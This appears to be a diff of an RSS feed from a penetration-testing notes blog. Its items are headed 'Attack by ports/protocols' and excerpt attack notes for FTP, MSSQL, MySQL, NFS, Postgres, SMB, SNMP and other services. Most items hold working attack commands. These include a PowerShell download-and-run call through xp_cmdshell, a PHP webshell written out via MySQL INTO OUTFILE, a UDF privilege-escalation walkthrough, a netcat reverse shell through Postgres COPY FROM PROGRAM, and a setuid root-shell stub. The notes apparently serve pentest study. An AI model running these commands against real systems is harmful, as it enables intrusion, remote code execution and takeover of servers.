@@ -126,127 +126,127 @@
     
     <item>
       <title>Notes - Attack by ports/protocols: FTP tcp:21, TFTP udp:69</title>
-      <link>https://meowmeowattack.github.io/notes/attack-by-protocols/ftp-tcp21&#43;tftp-udp69/</link>
+      <link>https://meowmeowattack.github.io/notes/ports-protocols/ftp/</link>
       <pubDate>Wed, 01 Jun 2022 23:18:05 +1300</pubDate>
       
-      <guid>https://meowmeowattack.github.io/notes/attack-by-protocols/ftp-tcp21&#43;tftp-udp69/</guid>
+      <guid>https://meowmeowattack.github.io/notes/ports-protocols/ftp/</guid>
       <description>21/tcp ftp https://book.hacktricks.xyz/pentesting/pentesting-ftp # ftp brute force&amp;gt; nmap --script ftp-brute -p 21 &amp;lt;host&amp;gt;# ftp `bounce` scan&amp;gt; nmap -PO -b username:password@ftpserver.tld:21 -vvv -oN scan_internal.nmap 127.0.0.1 --script=&amp;#34;default,vuln&amp;#34;# recursive download&amp;gt; wget -r ftp://anonymous:anonymous@&amp;lt;ip&amp;gt;:&amp;lt;port&amp;gt;/# Use `ls -la` to show hidden files# If cannot list directory, try `passive` mode lftp &amp;gt; lftplftp :~&amp;gt; set ftp:ssl-force falselftp :~&amp;gt; set ssl:verify-certificate nolftp :~&amp;gt; connect &amp;lt;ip&amp;gt;lftp :~&amp;gt; login anonymous anonymouslftp :~&amp;gt; ls udp/69 tftp https://book.</description>
     </item>
     
     <item>
       <title>Notes - Attack by ports/protocols: IRC tcp:194,6660-7000</title>
-      <link>https://meowmeowattack.github.io/notes/attack-by-protocols/irc-tcp1946660~7000/</link>
+      <link>https://meowmeowattack.github.io/notes/ports-protocols/irc/</link>
       <pubDate>Wed, 01 Jun 2022 23:18:05 +1300</pubDate>
       
-      <guid>https://meowmeowattack.github.io/notes/attack-by-protocols/irc-tcp1946660~7000/</guid>
+      <guid>https://meowmeowattack.github.io/notes/ports-protocols/irc/</guid>
       <description>tcp/194 6660-7000 irc &amp;gt; nmap -sV --script irc-botnet-channels,irc-info,irc-unrealircd-backdoor -p 194,6660-7000 &amp;lt;ip&amp;gt;&amp;gt; hexchat </description>
     </item>
     
     <item>
       <title>Notes - Attack by ports/protocols: MSSQL tcp:1433</title>
-      <link>https://meowmeowattack.github.io/notes/attack-by-protocols/mssql-tcp1433/</link>
+      <link>https://meowmeowattack.github.io/notes/ports-protocols/mssql/</link>
       <pubDate>Wed, 01 Jun 2022 23:18:05 +1300</pubDate>
       
-      <guid>https://meowmeowattack.github.io/notes/attack-by-protocols/mssql-tcp1433/</guid>
+      <guid>https://meowmeowattack.github.io/notes/ports-protocols/mssql/</guid>
       <description>tcp/1433 mssql RCE: https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server#execute-commands &amp;gt; impacket-mssqlclient &amp;lt;user&amp;gt;:&amp;lt;pass&amp;gt;@&amp;lt;ip&amp;gt;&amp;gt; enable_xp_cmdshell&amp;gt; xp_cmdshell powershell.exe IEX (New-Object Net.WebClient).DownloadString(\&amp;#34;http://&amp;lt;ip&amp;gt;/shell.ps1\&amp;#34;); error-based injeciton https://www.exploit-db.com/papers/12975 https://perspectiverisk.com/mssql-practical-injection-cheat-sheet/ cracking mdf files https://github.com/improvedk/OrcaMDF https://github.com/xpn/Powershell-PostExploitation/tree/master/Invoke-MDFHashes </description>
     </item>
     
     <item>
       <title>Notes - Attack by ports/protocols: MYSQL tcp:3306</title>
-      <link>https://meowmeowattack.github.io/notes/attack-by-protocols/mysql-tcp3306/</link>
+      <link>https://meowmeowattack.github.io/notes/ports-protocols/mysql/</link>
       <pubDate>Wed, 01 Jun 2022 23:18:05 +1300</pubDate>
       
-      <guid>https://meowmeowattack.github.io/notes/attack-by-protocols/mysql-tcp3306/</guid>
+      <guid>https://meowmeowattack.github.io/notes/ports-protocols/mysql/</guid>
       <description>tcp/3306 mysql write webshell to filesystem &amp;gt; SELECT &amp;#34;&amp;lt;?php echo shell_exec($_GET[&amp;#39;cmd&amp;#39;]);?&amp;gt;&amp;#34; INTO OUTFILE &amp;#34;/var/www/https/blogblog/wp-content/uploads/shell.php&amp;#34;; MariaDB MariaDB 10.2, https://github.com/Al1ex/CVE-2021-27928 Prepare the exploit: https://github.com/1N3/PrivEsc/blob/master/mysql/raptor_udf2.c &amp;gt; wget https://raw.githubusercontent.com/1N3/PrivEsc/master/mysql/raptor_udf2.c&amp;gt; gcc -g -c raptor_udf2.c&amp;gt; gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc&amp;gt; mysql -u root -p Exploit steps mysql&amp;gt; use mysql;mysql&amp;gt; create table foo(line blob);mysql&amp;gt; insert into foo values(load_file(&amp;#39;/tmp/raptor_udf2.so&amp;#39;));# Look for the value of plugin_dir and use the plugin_dir as the dump file locationmysql&amp;gt; show variables like &amp;#39;%plugin%&amp;#39;;mysql&amp;gt; select * from foo into dumpfile &amp;#34;&amp;lt;select-a-path-from-above&amp;gt;/raptor_udf2.</description>
     </item>
     
     <item>
       <title>Notes - Attack by ports/protocols: NFS tcp:2049</title>
-      <link>https://meowmeowattack.github.io/notes/attack-by-protocols/nfs-tcp2049/</link>
+      <link>https://meowmeowattack.github.io/notes/ports-protocols/nfs/</link>
       <pubDate>Wed, 01 Jun 2022 23:18:05 +1300</pubDate>
       
-      <guid>https://meowmeowattack.github.io/notes/attack-by-protocols/nfs-tcp2049/</guid>
+      <guid>https://meowmeowattack.github.io/notes/ports-protocols/nfs/</guid>
       <description>tcp/2049 NFS no_root_squash/no_all_squash misconfiguration PE Check vulnerability &amp;gt; showmount -e 127.0.0.1Export list for 127.0.0.1:/srv/Share 127.0.0.1/32,10.1.1.0/24&amp;gt; cat /etc/exports/srv/Share 10.1.1.0/24(insecure,rw)/srv/Share 127.0.0.1/32(`no_root_squash`,`insecure`,rw) Download exploit and compile: https://github.com/sahlberg/libnfs.git &amp;gt; ./bootstrap&amp;gt; ./configure&amp;gt; make&amp;gt; gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/ create a simple exploit pwn.c and compile, gcc pwn.c -o pwn int main(void){setreuid(0,0); sys tem(&amp;#34;/bin/bash&amp;#34;); return 0;} Transfer the compiled example (i.e ld_nfs.so), exploit (i.</description>
     </item>
     
     <item>
       <title>Notes - Attack by ports/protocols: POP3 tcp:110</title>
-      <link>https://meowmeowattack.github.io/notes/attack-by-protocols/pop3-tcp110/</link>
+      <link>https://meowmeowattack.github.io/notes/ports-protocols/pop3/</link>
       <pubDate>Wed, 01 Jun 2022 23:18:05 +1300</pubDate>
       
-      <guid>https://meowmeowattack.github.io/notes/attack-by-protocols/pop3-tcp110/</guid>
+      <guid>https://meowmeowattack.github.io/notes/ports-protocols/pop3/</guid>
       <description>tcp/110 pop3 receive emails &amp;gt; telnet &amp;lt;ip&amp;gt; 110&amp;gt; user &amp;lt;user&amp;gt;&amp;gt; pass &amp;lt;pass&amp;gt;&amp;gt; list&amp;gt; retr &amp;lt;num&amp;gt;, retr 1 </description>
     </item>
     
     <item>
       <title>Notes - Attack by ports/protocols: POSTGRES tcp:5432</title>
-      <link>https://meowmeowattack.github.io/notes/attack-by-protocols/postgres-tcp5432/</link>
+      <link>https://meowmeowattack.github.io/notes/ports-protocols/postgres/</link>
       <pubDate>Wed, 01 Jun 2022 23:18:05 +1300</pubDate>
       
-      <guid>https://meowmeowattack.github.io/notes/attack-by-protocols/postgres-tcp5432/</guid>
+      <guid>https://meowmeowattack.github.io/notes/ports-protocols/postgres/</guid>
       <description>tcp/5432 postgres RCE &amp;gt; create table logs (value text);&amp;gt; delete from logs; copy logs (value) from program &amp;#39;whoami&amp;#39;; select * from logs;&amp;gt; delete from logs; copy logs (value) from program &amp;#39;nc -v &amp;lt;ip&amp;gt; &amp;lt;port&amp;gt; -e /bin/bash&amp;#39;; select * from logs; For very restricted hosts, use base64 to transfer nc &amp;gt; base64 -w 0 &amp;lt; /usr/bin/nc &amp;gt; nc.txt&amp;gt; delete from logs; copy logs (value) from program &amp;#39;echo [base64_content] &amp;gt; /tmp/nc.</description>
     </item>
     
     <item>
       <title>Notes - Attack by ports/protocols: REDIS tcp:6379</title>
-      <link>https://meowmeowattack.github.io/notes/attack-by-protocols/redis-tcp6379/</link>
+      <link>https://meowmeowattack.github.io/notes/ports-protocols/redis/</link>
       <pubDate>Wed, 01 Jun 2022 23:18:05 +1300</pubDate>
       
-      <guid>https://meowmeowattack.github.io/notes/attack-by-protocols/redis-tcp6379/</guid>
+      <guid>https://meowmeowattack.github.io/notes/ports-protocols/redis/</guid>
       <description>tcp/6379 redis 5.0.9, https://github.com/vulhub/redis-rogue-getshell https://book.hacktricks.xyz/pentesting/6379-pentesting-redis </description>
     </item>
     
     <item>
       <title>Notes - Attack by ports/protocols: RSYNC tcp:873</title>
-      <link>https://meowmeowattack.github.io/notes/attack-by-protocols/rsync-tcp873/</link>
+      <link>https://meowmeowattack.github.io/notes/ports-protocols/rsync/</link>
       <pubDate>Wed, 01 Jun 2022 23:18:05 +1300</pubDate>
       
-      <guid>https://meowmeowattack.github.io/notes/attack-by-protocols/rsync-tcp873/</guid>
+      <guid>https://meowmeowattack.github.io/notes/ports-protocols/rsync/</guid>
       <description>tcp/873 rsync https://book.hacktricks.xyz/pentesting/873-pentesting-rsync &amp;gt; nmap -sV --script &amp;#34;rsync-list-modules&amp;#34; -p873 &amp;lt;ip&amp;gt;# list files&amp;gt; rsync -av --list-only rsync://&amp;lt;ip&amp;gt;# transfer files&amp;gt; rsync -av rsync://&amp;lt;ip&amp;gt;/fox ./fox # upload files&amp;gt; rsync -av .ssh/ rsync://&amp;lt;ip&amp;gt;/fox/.ssh </description>
     </item>
     
     <item>
       <title>Notes - Attack by ports/protocols: SMB tcp:139,445</title>
-      <link>https://meowmeowattack.github.io/notes/attack-by-protocols/smb-tcp139445/</link>
+      <link>https://meowmeowattack.github.io/notes/ports-protocols/smb/</link>
       <pubDate>Wed, 01 Jun 2022 23:18:05 +1300</pubDate>
       
-      <guid>https://meowmeowattack.github.io/notes/attack-by-protocols/smb-tcp139445/</guid>
+      <guid>https://meowmeowattack.github.io/notes/ports-protocols/smb/</guid>
       <description>tcp/139 smb grep the smb version, https://github.com/rewardone/OSCPRepo/blob/master/scripts/recon_enum/smbver.sh &amp;gt; ngrep -i -d tun0 &amp;#39;s.?a.?m.?b.?a.*[[:digit:]]&amp;#39;&amp;gt; smbclient -L \\\\ip -N new smbclient doesn&amp;rsquo;t support old protocols, to enable # edit /etc/samba/smb.conf under `global`client min protocol = LANMAN1&amp;gt; service smbd restart smb 3.4.5 symlink directory traversal: https://github.com/roughiz/Symlink-Directory-Traversal-smb-manually List all smb shared &amp;gt; smbclient -L \\\\{target-ip}\\ -U {user_name} Recurse all content under share &amp;gt; smbmap -u {user} -p {pass} -H {target-ip} -d {target.</description>
     </item>
     
     <item>
       <title>Notes - Attack by ports/protocols: SMTP tcp:25</title>
-      <link>https://meowmeowattack.github.io/notes/attack-by-protocols/smtp-tcp25/</link>
+      <link>https://meowmeowattack.github.io/notes/ports-protocols/smtp/</link>
       <pubDate>Wed, 01 Jun 2022 23:18:05 +1300</pubDate>
       
-      <guid>https://meowmeowattack.github.io/notes/attack-by-protocols/smtp-tcp25/</guid>
+      <guid>https://meowmeowattack.github.io/notes/ports-protocols/smtp/</guid>
       <description>tcp/25 smtp &amp;gt; smtp-user-enum -U /usr/share/wordlists/dirb/others/names.txt -M RCPT -t &amp;lt;ip&amp;gt;&amp;gt; perl smtp-user-enum.pl -M VRFY -U /usr/share/seclists/Usernames/Names/names.txt -t &amp;lt;ip&amp;gt;&amp;gt; nmap --script smtp-enum-users &amp;lt;ip&amp;gt; -Pn </description>
     </item>
     
     <item>
       <title>Notes - Attack by ports/protocols: SNMP udp:161</title>
-      <link>https://meowmeowattack.github.io/notes/attack-by-protocols/snmp-udp161/</link>
+      <link>https://meowmeowattack.github.io/notes/ports-protocols/snmp/</link>
       <pubDate>Wed, 01 Jun 2022 23:18:05 +1300</pubDate>
       
-      <guid>https://meowmeowattack.github.io/notes/attack-by-protocols/snmp-udp161/</guid>
+      <guid>https://meowmeowattack.github.io/notes/ports-protocols/snmp/</guid>
       <description>udp/161 snmp 161 uses UDP, hence need the nmap -sU flag to scan https://github.com/dheiland-r7/snmp &amp;gt; perl snmpbw.pl &amp;lt;ip&amp;gt; public 2 1 community string enum: # https://raw.githubusercontent.com/thedarksource/Security/master/Network/SNMP/snmp_community_strings_wordlist_onesixtyone.txt# /usr/share/wordlists/SecLists/Discovery/SNMP/&amp;gt; onesixtyone &amp;lt;ip&amp;gt; -c snmp_community_strings_wordlist_onesixtyone.txt snmp-check &amp;gt; snmp-check &amp;lt;ip&amp;gt; snmpwalk, setup with extended walk: https://book.hacktricks.xyz/pentesting/pentesting-snmp/snmp-rce#getting-the-shell-from-net-snmp-extend &amp;gt; snmpwalk -v 2c -c public &amp;lt;ip&amp;gt; NET-SNMP-EXTEND-MIB::nsExtendObjects&amp;gt; snmpwalk -v 2c -c public &amp;lt;ip&amp;gt; NET-SNMP-EXTEND-MIB::nsExtendOutputFull </description>
     </item>
     
     <item>
       <title>Notes - Attack by ports/protocols: SSH tcp:22</title>
-      <link>https://meowmeowattack.github.io/notes/attack-by-protocols/ssh-tcp22/</link>
+      <link>https://meowmeowattack.github.io/notes/ports-protocols/ssh/</link>
       <pubDate>Wed, 01 Jun 2022 23:18:05 +1300</pubDate>
       
-      <guid>https://meowmeowattack.github.io/notes/attack-by-protocols/ssh-tcp22/</guid>
+      <guid>https://meowmeowattack.github.io/notes/ports-protocols/ssh/</guid>
       <description>22/tcp ssh Recover from authorized_keys: https://blog.g0tmi1k.com/2010/04/pwnos/ ssh key prediction: https://gitbook.brainyou.stream/basic-linux/ssh-key-predictable-prng-authorized_keys-process </description>
     </item>
     
     <item>
       <title>Notes - Attack by ports/protocols: TELNET tcp:23</title>
-      <link>https://meowmeowattack.github.io/notes/attack-by-protocols/telnet-tcp23/</link>
+      <link>https://meowmeowattack.github.io/notes/ports-protocols/telnet/</link>
       <pubDate>Wed, 01 Jun 2022 23:18:05 +1300</pubDate>
       
-      <guid>https://meowmeowattack.github.io/notes/attack-by-protocols/telnet-tcp23/</guid>
+      <guid>https://meowmeowattack.github.io/notes/ports-protocols/telnet/</guid>
       <description>23/tcp telnet telnet supports login, the password prompt may be slow &amp;gt; telnet -l &amp;lt;user&amp;gt; &amp;lt;ip&amp;gt; </description>
     </item>
     
